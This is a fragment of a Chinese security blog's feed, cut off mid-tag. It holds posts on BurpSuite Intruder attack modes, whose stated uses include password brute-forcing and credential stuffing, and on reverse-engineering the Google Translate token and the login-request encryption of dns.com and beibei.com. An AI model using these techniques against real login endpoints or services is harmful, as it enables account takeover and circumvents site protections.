    <content type="html"><![CDATA[<h2 id="一、Sniper（狙击手）">一、Sniper（狙击手）</h2><p>Sniper模式只能使用一组 payload 集合，一次只使用一个 payload 位置；假如标记了两个位置 “A” 和 “B” ，payload 集合内有“1”和“2”两个值，那么它攻击会形成以下组合：</p><table><thead><tr><th style="text-align:center">攻击序列</th><th style="text-align:center">位置A</th><th style="text-align:center">位置B</th></tr></thead><tbody><tr><td style="text-align:center">1</td><td style="text-align:center">1</td><td style="text-align:center">不替换</td></tr><tr><td style="text-align:center">2</td><td style="text-align:center">2</td><td style="text-align:center">不替换</td></tr><tr><td style="text-align:center">3</td><td style="text-align:center">不替换</td><td style="text-align:center">1</td></tr><tr><td style="text-align:center">4</td><td style="text-align:center">不替换</td><td style="text-align:center">2</td></tr></tbody></table><p>适用场景：竞争条件测试（选择Null payloads），密码、验证码暴力破解，重放攻击等场景</p><h2 id="二、Battering-ram（攻城锤）">二、Battering ram（攻城锤）</h2><p>同样只能使用一组 payload 集合，不同的地方在于每次攻击都是替换所有payload标记位置；如果添加了两个参数的话，就一起进行爆破，两个参数爆破时候的值肯定就是一样的了：</p><table><thead><tr><th style="text-align:center">攻击序列</th><th style="text-align:center">位置A</th><th style="text-align:center">位置B</th></tr></thead><tbody><tr><td style="text-align:center">1</td><td style="text-align:center">1</td><td style="text-align:center">1</td></tr><tr><td style="text-align:center">2</td><td style="text-align:center">2</td><td style="text-align:center">2</td></tr></tbody></table><p>适用场景：暴力破解</p><h2 id="三、Pitchfork（草叉）">三、Pitchfork（草叉）</h2><p>草叉模式允许使用多组payload组合，如果只添加了一个参数的话，会报错；在每个标记位置上遍历各自对应的payload组合，假设有两个位置“A”和“B”，payload组合1的值为“1”和“2”，payload组合2的值为“3”和“4”，那么它攻击会形成以下组合：</p><table><thead><tr><th style="text-align:center">攻击序列</th><th style="text-align:center">位置A</th><th style="text-align:center">位置B</th></tr></thead><tbody><tr><td style="text-align:center">1</td><td style="text-align:center">1</td><td style="text-align:center">3</td></tr><tr><td style="text-align:center">2</td><td style="text-align:center">2</td><td style="text-align:center">4</td></tr></tbody></table><p>注：如果两个payload行数不一致的话，取最小值进行测试。所以爆破的次数取两个中最小的为准。</p><p>适用场景：恶意注册、撞裤</p><h2 id="四、Cluster-bomb（集束炸弹）">四、Cluster bomb（集束炸弹）</h2><p>集束炸弹也允许使用多组payload组合，跟草叉模式不同的地方在于，集束炸弹模式会对payload组进行笛卡尔积，那么它攻击会形成以下组合：</p><table><thead><tr><th style="text-align:center">攻击序列</th><th style="text-align:center">位置A</th><th style="text-align:center">位置B</th></tr></thead><tbody><tr><td style="text-align:center">1</td><td style="text-align:center">1</td><td style="text-align:center">3</td></tr><tr><td style="text-align:center">2</td><td style="text-align:center">1</td><td style="text-align:center">4</td></tr><tr><td style="text-align:center">1</td><td style="text-align:center">2</td><td style="text-align:center">3</td></tr><tr><td style="text-align:center">2</td><td style="text-align:center">2</td><td style="text-align:center">4</td></tr></tbody></table><p>适用场景：账号、密码暴力破解</p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h2 id=&quot;一、Sniper（狙击手）&quot;&gt;一、Sniper（狙击手）&lt;/h2&gt;
&lt;p&gt;Sniper模式只能使用一组 payload 集合，一次只使用一个 payload 位置；假如标记了两个位置 “A” 和 “B” ，payload 集合内有“1”和“2”两个值，那么它攻击会
      
    
    </summary>
    
    
      <category term="工具" scheme="http://yoursite.com/categories/%E5%B7%A5%E5%85%B7/"/>
    
    
      <category term="BurpSuite" scheme="http://yoursite.com/tags/BurpSuite/"/>
    
  </entry>
  
  <entry>
    <title>JS逆向系列之谷歌翻译</title>
    <link href="http://yoursite.com/2020/06/17/JS%E9%80%86%E5%90%91%E4%B9%8B%E8%B0%B7%E6%AD%8C%E7%BF%BB%E8%AF%91/"/>
    <id>http://yoursite.com/2020/06/17/JS%E9%80%86%E5%90%91%E4%B9%8B%E8%B0%B7%E6%AD%8C%E7%BF%BB%E8%AF%91/</id>
    <published>2020-06-17T10:16:58.000Z</published>
    <updated>2020-06-17T10:16:58.000Z</updated>
    
    <content type="html"><![CDATA[<h3 id="一、逆向谷歌翻译">一、逆向谷歌翻译</h3><h4 id="分析过程">分析过程</h4><ul><li>首次分析</li></ul><p>首先找到谷歌翻译的Ajax请求接口</p><p><img src="https://raw.githubusercontent.com/Dsysf/images/master/img/20200529141646.png" alt=""></p><p>以get方式发送的Ajax请求，多次尝试，发现请求参数中，<code>tk</code>和<code>q</code>，是不断变化的，其中<code>q</code>是待翻译的内容，<code>tk</code>是根据<code>q</code>进行js加密算法生成的，所以我们要分析<code>tk</code>的产生。</p><ul><li>通过断点逆向<code>tk</code>的加密算法</li></ul><p>加密算法应该在translate_m_zh-CN.js文件里</p><p><img src="https://raw.githubusercontent.com/Dsysf/images/master/img/20200529142909.png" alt=""></p><p>打个断点，请求翻译接口的URL时停止，发现在send(a)中停止了，根据Call Stack的调用关系，一步步分析，最上面的就是send函数</p><p><img src="https://raw.githubusercontent.com/Dsysf/images/master/img/20200529143414.png" alt=""></p><p>依次往下点击每一个调用的函数，当到了QE函数的时候，发现了<code>tk</code>参数来自b，b又明显来自c</p><p><img src="https://raw.githubusercontent.com/Dsysf/images/master/img/20200529143742.png" alt=""></p><p>于是我们顺藤摸瓜，发现c是由PE(d)产生的，PE又是来自pu(a)函数，我们跳转到pu函数的位置，似乎已经有了答案</p><p><img src="https://raw.githubusercontent.com/Dsysf/images/master/img/20200529144207.png" alt=""></p><p><img src="https://raw.githubusercontent.com/Dsysf/images/master/img/20200529144416.png" alt=""></p><p><img src="https://raw.githubusercontent.com/Dsysf/images/master/img/20200529144520.png" alt=""></p><ul><li>分析生成<code>tk</code>的JS代码</li></ul><p>如下是我们刚获取的JS代码</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> mu = <span class="function"><span class="keyword">function</span>(<span class="params">a</span>) </span>&#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="function"><span class="keyword">function</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> a</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">  , nu = <span class="function"><span class="keyword">function</span>(<span class="params">a, b</span>) </span>&#123;</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">var</span> c = <span class="number">0</span>; c &lt; b.length - <span class="number">2</span>; c += <span class="number">3</span>) &#123;</span><br><span class="line">        <span class="keyword">var</span> d = b.charAt(c + <span class="number">2</span>);</span><br><span class="line">        d = <span class="string">&quot;a&quot;</span> &lt;= d ? d.charCodeAt(<span class="number">0</span>) - <span class="number">87</span> : <span class="built_in">Number</span>(d);</span><br><span class="line">        d = <span class="string">&quot;+&quot;</span> == b.charAt(c + <span class="number">1</span>) ? a &gt;&gt;&gt; d : a &lt;&lt; d;</span><br><span class="line">        a = <span class="string">&quot;+&quot;</span> == b.charAt(c) ? a + d &amp; <span class="number">4294967295</span> : a ^ d</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> a</span><br><span class="line">&#125;</span><br><span class="line">  , ou = <span class="literal">null</span></span><br><span class="line">  , pu = <span class="function"><span class="keyword">function</span>(<span class="params">a</span>) </span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (<span class="literal">null</span> !== ou)</span><br><span class="line">        <span class="keyword">var</span> b = ou;</span><br><span class="line">    <span class="keyword">else</span> &#123;</span><br><span class="line">        b = mu(<span class="built_in">String</span>.fromCharCode(<span class="number">84</span>));</span><br><span class="line">        <span class="keyword">var</span> c = mu(<span class="built_in">String</span>.fromCharCode(<span class="number">75</span>));</span><br><span class="line">        b = [b(), b()];</span><br><span class="line">        b[<span class="number">1</span>] = c();</span><br><span class="line">        b = (ou = <span class="built_in">window</span>[b.join(c())] || <span class="string">&quot;&quot;</span>) || <span class="string">&quot;&quot;</span></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">var</span> d = mu(<span class="built_in">String</span>.fromCharCode(<span class="number">116</span>));</span><br><span class="line">    c = mu(<span class="built_in">String</span>.fromCharCode(<span class="number">107</span>));</span><br><span class="line">    d = [d(), d()];</span><br><span class="line">    d[<span class="number">1</span>] = c();</span><br><span class="line">    c = <span class="string">&quot;&amp;&quot;</span> + d.join(<span class="string">&quot;&quot;</span>) + <span class="string">&quot;=&quot;</span>;</span><br><span class="line">    d = b.split(<span class="string">&quot;.&quot;</span>);</span><br><span class="line">    b = <span class="built_in">Number</span>(d[<span class="number">0</span>]) || <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">var</span> e = [], f = <span class="number">0</span>, g = <span class="number">0</span>; g &lt; a.length; g++) &#123;</span><br><span class="line">        <span class="keyword">var</span> h = a.charCodeAt(g);</span><br><span class="line">        <span class="number">128</span> &gt; h ? e[f++] = h : (<span class="number">2048</span> &gt; h ? e[f++] = h &gt;&gt; <span class="number">6</span> | <span class="number">192</span> : (<span class="number">55296</span> == (h &amp; <span class="number">64512</span>) &amp;&amp; g + <span class="number">1</span> &lt; a.length &amp;&amp; <span class="number">56320</span> == (a.charCodeAt(g + <span class="number">1</span>) &amp; <span class="number">64512</span>) ? (h = <span class="number">65536</span> + ((h &amp; <span class="number">1023</span>) &lt;&lt; <span class="number">10</span>) + (a.charCodeAt(++g) &amp; <span class="number">1023</span>),</span><br><span class="line">        e[f++] = h &gt;&gt; <span class="number">18</span> | <span class="number">240</span>,</span><br><span class="line">        e[f++] = h &gt;&gt; <span class="number">12</span> &amp; <span class="number">63</span> | <span class="number">128</span>) : e[f++] = h &gt;&gt; <span class="number">12</span> | <span class="number">224</span>,</span><br><span class="line">        e[f++] = h &gt;&gt; <span class="number">6</span> &amp; <span class="number">63</span> | <span class="number">128</span>),</span><br><span class="line">        e[f++] = h &amp; <span class="number">63</span> | <span class="number">128</span>)</span><br><span class="line">    &#125;</span><br><span class="line">    a = b;</span><br><span class="line">    <span class="keyword">for</span> (f = <span class="number">0</span>; f &lt; e.length; f++)</span><br><span class="line">        a += e[f],</span><br><span class="line">        a = nu(a, <span class="string">&quot;+-a^+6&quot;</span>);</span><br><span class="line">    a = nu(a, <span class="string">&quot;+-3^+b+-f&quot;</span>);</span><br><span class="line">    a ^= <span class="built_in">Number</span>(d[<span class="number">1</span>]) || <span class="number">0</span>;</span><br><span class="line">    <span class="number">0</span> &gt; a &amp;&amp; (a = (a &amp; <span class="number">2147483647</span>) + <span class="number">2147483648</span>);</span><br><span class="line">    a %= <span class="number">1E6</span>;</span><br><span class="line">    <span class="keyword">return</span> c + (a.toString() + <span class="string">&quot;.&quot;</span> + (a ^ b))</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p>发现做了很多不必要的操作、甚至多此一举，目的是用于混淆<br>如：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">var mu &#x3D; function(a) &#123;</span><br><span class="line">    return function() &#123;</span><br><span class="line">        return a</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>还用了<code>.fromCharCode()</code>函数，把数字转换为字母，明显多此一举的操作。但是，通过分析，发现<code>tk</code>生成需要另一样东西，就是<code>tkk</code>这个参数，来源于网页源代码上，寻找一番，还是发现了，多次尝试，发现这个值是固定的</p><p><img src="https://raw.githubusercontent.com/Dsysf/images/master/img/20200529145556.png" alt=""></p><h4 id="具体实现">具体实现</h4><p>说明：js文件做了精炼，把不必要的值去掉了，实行的效果是英译中，不同语言的翻译修改请求的参数即可</p><ul><li>Python脚本</li></ul><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> json</span><br><span class="line"><span class="keyword">import</span> execjs</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">get_tk</span>(<span class="params">q</span>):</span></span><br><span class="line">    <span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&#x27;google_tk.js&#x27;</span>, <span class="string">&#x27;r&#x27;</span>, encoding=<span class="string">&#x27;utf-8&#x27;</span>) <span class="keyword">as</span> f:</span><br><span class="line">        js = f.read()</span><br><span class="line">    j = execjs.<span class="built_in">compile</span>(js)</span><br><span class="line">    tk = j.call(<span class="string">&#x27;pu&#x27;</span>, q)</span><br><span class="line">    <span class="keyword">return</span> tk</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">translate_google</span>():</span></span><br><span class="line">    q = <span class="built_in">input</span>(<span class="string">&quot;请输入你要翻译的内容：&quot;</span>)</span><br><span class="line">    headers = &#123;</span><br><span class="line">        <span class="string">&quot;user-agent&quot;</span>: <span class="string">&quot;Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.61 Safari/537.36&quot;</span>,</span><br><span class="line">        <span class="string">&quot;referer&quot;</span>: <span class="string">&quot;https://translate.google.cn/&quot;</span></span><br><span class="line">    &#125;</span><br><span class="line">    url = <span class="string">&quot;https://translate.google.cn/translate_a/single?client=webapp&amp;sl=en&amp;tl=zh-CN&amp;hl=zh-CN&amp;dt=at&amp;dt=bd&amp;dt=ex&amp;dt=ld&amp;dt=md&amp;dt=qca&amp;dt=rw&amp;dt=rm&amp;dt=sos&amp;dt=ss&amp;dt=t&amp;otf=2&amp;ssel=0&amp;tsel=0&amp;kc=3&amp;tk=&quot;</span> + get_tk(</span><br><span class="line">        q) + <span class="string">&quot;&amp;q=&quot;</span> + q</span><br><span class="line">    res = requests.get(url, headers=headers)</span><br><span class="line">    data = res.content.decode()</span><br><span class="line">    json_data = json.loads(data)</span><br><span class="line">    print(json_data[<span class="number">0</span>][<span class="number">0</span>][<span class="number">0</span>])</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    translate_google()</span><br><span class="line"></span><br></pre></td></tr></table></figure><ul><li>tk.js</li></ul><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//tkk = &#x27;441865.2154418832&#x27;;</span></span><br><span class="line"><span class="keyword">var</span> nu = <span class="function"><span class="keyword">function</span> (<span class="params">a, b</span>) </span>&#123;</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">var</span> c = <span class="number">0</span>; c &lt; b.length - <span class="number">2</span>; c += <span class="number">3</span>) &#123;</span><br><span class="line">        <span class="keyword">var</span> d = b.charAt(c + <span class="number">2</span>);</span><br><span class="line">        d = <span class="string">&quot;a&quot;</span> &lt;= d ? d.charCodeAt(<span class="number">0</span>) - <span class="number">87</span> : <span class="built_in">Number</span>(d);</span><br><span class="line">        d = <span class="string">&quot;+&quot;</span> == b.charAt(c + <span class="number">1</span>) ? a &gt;&gt;&gt; d : a &lt;&lt; d;</span><br><span class="line">        a = <span class="string">&quot;+&quot;</span> == b.charAt(c) ? a + d &amp; <span class="number">4294967295</span> : a ^ d</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> a</span><br><span class="line">&#125;,</span><br><span class="line"></span><br><span class="line">pu = <span class="function"><span class="keyword">function</span> (<span class="params">a</span>) </span>&#123;</span><br><span class="line">    tkk=<span class="string">&#x27;441865.2154418832&#x27;</span>;</span><br><span class="line">    <span class="keyword">var</span> d = tkk.split(<span class="string">&quot;.&quot;</span>);</span><br><span class="line">    <span class="keyword">var</span> b = <span class="built_in">Number</span>(d[<span class="number">0</span>]);</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">var</span> e = [], f = <span class="number">0</span>, g = <span class="number">0</span>; g &lt; a.length; g++) &#123;</span><br><span class="line">        <span class="keyword">var</span> h = a.charCodeAt(g);</span><br><span class="line">        <span class="number">128</span> &gt; h ? e[f++] = h :</span><br><span class="line">            (<span class="number">2048</span> &gt; h ? e[f++] = h &gt;&gt; <span class="number">6</span> | <span class="number">192</span> :</span><br><span class="line">                    (<span class="number">55296</span> == (h &amp; <span class="number">64512</span>) &amp;&amp; g + <span class="number">1</span> &lt; a.length &amp;&amp; <span class="number">56320</span> == (a.charCodeAt(g + <span class="number">1</span>) &amp; <span class="number">64512</span>) ? (h = <span class="number">65536</span> + ((h &amp; <span class="number">1023</span>) &lt;&lt; <span class="number">10</span>) + (a.charCodeAt(++g) &amp; <span class="number">1023</span>), e[f++] = h &gt;&gt; <span class="number">18</span> | <span class="number">240</span>, e[f++] = h &gt;&gt; <span class="number">12</span> &amp; <span class="number">63</span> | <span class="number">128</span>) :</span><br><span class="line">                        e[f++] = h &gt;&gt; <span class="number">12</span> | <span class="number">224</span>, e[f++] = h &gt;&gt; <span class="number">6</span> &amp; <span class="number">63</span> | <span class="number">128</span>), e[f++] = h &amp; <span class="number">63</span> | <span class="number">128</span>)</span><br><span class="line">    &#125;</span><br><span class="line">    a = b;</span><br><span class="line">    <span class="keyword">for</span> (f = <span class="number">0</span>; f &lt; e.length; f++)</span><br><span class="line">        a += e[f],</span><br><span class="line">        a = nu(a, <span class="string">&quot;+-a^+6&quot;</span>);</span><br><span class="line">    a = nu(a, <span class="string">&quot;+-3^+b+-f&quot;</span>);</span><br><span class="line">    a ^= <span class="built_in">Number</span>(d[<span class="number">1</span>]) || <span class="number">0</span>;</span><br><span class="line">    <span class="number">0</span> &gt; a &amp;&amp; (a = (a &amp; <span class="number">2147483647</span>) + <span class="number">2147483648</span>);</span><br><span class="line">    a %= <span class="number">1E6</span>;</span><br><span class="line">    <span class="keyword">return</span> (a.toString() + <span class="string">&quot;.&quot;</span> + (a ^ b))</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><h4 id="运行效果">运行效果</h4><p><img src="https://raw.githubusercontent.com/Dsysf/images/master/img/20200529150718.png" alt=""></p><h3 id="二、总结常见算法的加密原理">二、总结常见算法的加密原理</h3><ul><li>散列(hash)函数算法：MD5、SHA</li><li>对称加密算法：DES、3DES、AES</li><li>非对称性加密算法：RSA、DSA、ECC</li></ul><h4 id="散列-hash-函数算法">散列(hash)函数算法</h4><ul><li>简介</li></ul><p>Hash也称散列、哈希，对应的英文都是Hash。基本原理就是把任意长度的输入，通过Hash算法变成固定长度的输出。这个映射的规则就是对应的Hash算法，而原始数据映射后的二进制串就是哈希值。活动开发中经常使用的MD5和SHA都是历史悠久的Hash算法。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">echo md5(&quot;这是一个测试文案&quot;);&#x2F;&#x2F; 输出结果：2124968af757ed51e71e6abeac04f98d</span><br></pre></td></tr></table></figure><ul><li>特点</li></ul><p>一、不可逆，与原视数据没有对应关系<br>二、输入数据的微小变化会得到完全不同的hash值，相同的数据会得到相同的值<br>三、hash算法冲突概率比较小，但是根据抽屉原理，一定会存在不同的输入被映射成相同输出的情况</p><h4 id="对称加密算法">对称加密算法</h4><ul><li>简介</li></ul><p>秘钥：加密解密使用同一个密钥、数据的机密性双向保证、加密效率高、适合加密于大数据大文件、加密强度不高(相对于非对称加密)</p><h4 id="非对称性加密算法">非对称性加密算法</h4><ul><li>简介</li></ul><p>秘钥：加密解密使用的不同秘钥、有两个密钥、需要使用密钥生成算法生成两个秘钥、数据的机密性只能单向加密、如果想解决这个问题、双向都需要各自有一对秘钥、加密效率低、加密强度高</p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h3 id=&quot;一、逆向谷歌翻译&quot;&gt;一、逆向谷歌翻译&lt;/h3&gt;
&lt;h4 id=&quot;分析过程&quot;&gt;分析过程&lt;/h4&gt;
&lt;ul&gt;
&lt;li&gt;首次分析&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;首先找到谷歌翻译的Ajax请求接口&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://raw.githubuse
      
    
    </summary>
    
    
      <category term="JS逆向" scheme="http://yoursite.com/categories/JS%E9%80%86%E5%90%91/"/>
    
    
      <category term="JS逆向系列" scheme="http://yoursite.com/tags/JS%E9%80%86%E5%90%91%E7%B3%BB%E5%88%97/"/>
    
  </entry>
  
  <entry>
    <title>JS逆向系列一</title>
    <link href="http://yoursite.com/2020/06/17/JS%E9%80%86%E5%90%91%E4%B8%80/"/>
    <id>http://yoursite.com/2020/06/17/JS%E9%80%86%E5%90%91%E4%B8%80/</id>
    <published>2020-06-17T10:16:58.000Z</published>
    <updated>2020-06-17T10:16:58.000Z</updated>
    
    <content type="html"><![CDATA[<h3 id="谷歌学术镜像">谷歌学术镜像</h3><p>目标网址：<a href="https://ac.scmor.com/">https://ac.scmor.com/</a></p><p><img src="https://raw.githubusercontent.com/Dsysf/images/master/img/20200531174729.png" alt=""></p><p>目的是爬取学术镜像的真实地址，在Elements视图下，观察<code>现在访问</code>a标签，发现启用了onclick事件，调用了<code>visit()</code>函数，函数内的内容，猜测就是加密后的真实URL地址。</p><p><img src="https://raw.githubusercontent.com/Dsysf/images/master/img/20200531174922.png" alt=""></p><p>全局搜索<code>visit</code>,在 <a href="https://ac.scmor.com/res/?f=run&amp;v=1590682984">https://ac.scmor.com/res/?f=run&amp;v=1590682984</a> 中，找到了<code>visit</code>函数</p><p><img src="https://raw.githubusercontent.com/Dsysf/images/master/img/20200531175244.png" alt=""></p><p>经过观察，猜测<code>strdecode</code>是解密函数，就在上几行的位置，有个可疑参数<code>autour[b]</code>，猜测是URL地址，在Console中测试一下</p><p><img src="https://raw.githubusercontent.com/Dsysf/images/master/img/20200531180634.png" alt=""></p><p><img src="https://raw.githubusercontent.com/Dsysf/images/master/img/20200531180730.png" alt=""></p><p>经测试，<code>autour</code>是个数组，里面存放了加密后的真实地址，<code>strdecode</code>也的确是解密函数，现在去拉取<code>strdecode</code>函数具体内容<br>全局搜索，找到了<code>strdecode</code>，经过初步观察，是Base64加密，然后缺啥补啥，将加密函数完整的提取出来</p><p><img src="https://raw.githubusercontent.com/Dsysf/images/master/img/20200531181249.png" alt=""></p><p>到此，加密函数也有了，现在需要收集全部的URL，于是，之前的<code>autour</code>数组，也拉下来，现在只需要遍历一下就好了，刚好有个<code>run</code>函数就是For循环遍历<code>autour</code>数组，也拿下来</p><p><img src="https://raw.githubusercontent.com/Dsysf/images/master/img/20200531181940.png" alt=""></p><p>稍微修改下细节，就大功告成，效果图如下：</p><p><img src="https://raw.githubusercontent.com/Dsysf/images/master/img/20200531182151.png" alt=""></p><h3 id="DNS-COM"><a href="http://DNS.COM">DNS.COM</a></h3><p>目标网址：<a href="https://www.dns.com/login.html">https://www.dns.com/login.html</a></p><p><img src="https://raw.githubusercontent.com/Dsysf/images/master/img/20200601011619.png" alt=""></p><p>随便输入帐号密码进行测试，发现有个XHR请求，里面的<code>password</code>，<code>email</code>两个请求参数都做了加密，猜测这就是刚才输入的帐号密码</p><p><img src="https://raw.githubusercontent.com/Dsysf/images/master/img/20200601011947.png" alt=""></p><p>全局搜索 <code>password</code>,通过在后面加上 : 或者 = 可以缩小范围，排除多余项，找到了<code>password:</code>的位置，现在其实已经很明显是AES加密了，但还是测试一下吧</p><p><img src="https://raw.githubusercontent.com/Dsysf/images/master/img/20200601012327.png" alt=""></p><p>打断点，重新登陆，果然进入debugger状态了。</p><p><img src="https://raw.githubusercontent.com/Dsysf/images/master/img/20200601012821.png" alt=""></p><p>然后在console中测试下<code>aes()</code>函数以及它的参数到底是什么，经验证，发现<code>aes()</code>正是一个加密函数，加密后的内容和一开始看到的相吻合</p><p><img src="https://raw.githubusercontent.com/Dsysf/images/master/img/20200601013000.png" alt=""></p><p>现在查看<code>aes</code>函数具体的内容，发现了又有<code>k</code>和<code>iv</code>，并且有个CryptoJS对象</p><p><img src="https://raw.githubusercontent.com/Dsysf/images/master/img/20200601095717.png" alt=""></p><p>全局搜索CryptoJS，发现了<code>crypto-js.js</code>文件，明显这是CryptoJS加密库</p><p><img src="https://raw.githubusercontent.com/Dsysf/images/master/img/20200601100429.png" alt=""></p><p>并且发现还用了<code>$(selector).action()</code>的jQuery语法，所以还需要载入jQuery库</p><p><img src="https://raw.githubusercontent.com/Dsysf/images/master/img/20200601112445.png" alt=""></p><p>从网上下载单独的CryptoJS库文件引入，从 网页中获取jQuery链接，并载入 jQuery，然后将<code>aes</code>函数也拉下来</p><p><img src="https://raw.githubusercontent.com/Dsysf/images/master/img/20200601113127.png" alt=""></p><p>效果图如下：</p><p><img src="https://raw.githubusercontent.com/Dsysf/images/master/img/20200601113229.png" alt=""></p><h3 id="贝贝网">贝贝网</h3><p>目标网址：<a href="https://m.beibei.com/login/login.html">https://m.beibei.com/login/login.html</a> （需手机端）</p><p><img src="https://raw.githubusercontent.com/Dsysf/images/master/img/20200601154549.png" alt=""></p><p>输入帐号密码及验证码进行测试，发现一个XHR请求，类型为POST，提交的表单数据中的用户名密码都为明文，但问题在于请求参数中的<code>_abr_</code>一直在变化，猜测它为加密参数</p><p><img src="https://raw.githubusercontent.com/Dsysf/images/master/img/20200601155448.png" alt=""></p><p>全局搜索<code>_abr_</code>无果，只能打请求断点，成功断住</p><p><img src="https://raw.githubusercontent.com/Dsysf/images/master/img/20200601160354.png" alt=""></p><p>但是发现断点的位置没有我们要的内容，于是在call Stack中往下找调用栈，call Stack内的方法调用栈的规则是从上到下由最新调用处依次往下排列。在<code>e.ajax</code>中发现了包含有<code>_abr_</code>的内容，但是这里是要发送出去了，没有它的产生过程，于是继续往下找，终于找到了<code>_abr_=</code></p><p><img src="https://raw.githubusercontent.com/Dsysf/images/master/img/20200601163002.png" alt=""></p><p><img src="https://raw.githubusercontent.com/Dsysf/images/master/img/20200601163301.png" alt=""></p><p>记录<code>_abr_</code>的值为：“013e01885f35c08258b6ce21d500874ed5bb3143a05ed4b7b1”<br>发现<code>_abr_</code>其实是由<code>m(e.type, e.uri.pathname, e.query, e.form)</code>函数生成，于是为了了解它的生成过程，在函数前打上断点，重新发送登陆请求</p><p><img src="https://raw.githubusercontent.com/Dsysf/images/master/img/20200601165214.png" alt=""></p><p>单步跟踪，发现了关键函数<code>MD5</code></p><p><img src="https://raw.githubusercontent.com/Dsysf/images/master/img/20200601165852.png" alt=""></p><p><img src="https://raw.githubusercontent.com/Dsysf/images/master/img/20200601170350.png" alt=""></p><p>继续单步跟踪，又发现了一个关键函数<code>HMAC</code></p><p><img src="https://raw.githubusercontent.com/Dsysf/images/master/img/20200601171039.png" alt=""></p><p><img src="https://raw.githubusercontent.com/Dsysf/images/master/img/20200601171405.png" alt=""></p><p>网上查找资料了解这个加密算法，发现HMAC算法，需要一个信息摘要算法以及一个密钥，在下方又找到关键函数<code>HmacSHA1</code>，于是推测使用了SHA-1算法</p><p><img src="https://raw.githubusercontent.com/Dsysf/images/master/img/20200601171755.png" alt=""></p><p><img src="https://raw.githubusercontent.com/Dsysf/images/master/img/20200601185857.png" alt=""></p><p>经过长时间的单步跟踪，总算来到了一开始的函数返回值部分</p><p><img src="https://raw.githubusercontent.com/Dsysf/images/master/img/20200601174129.png" 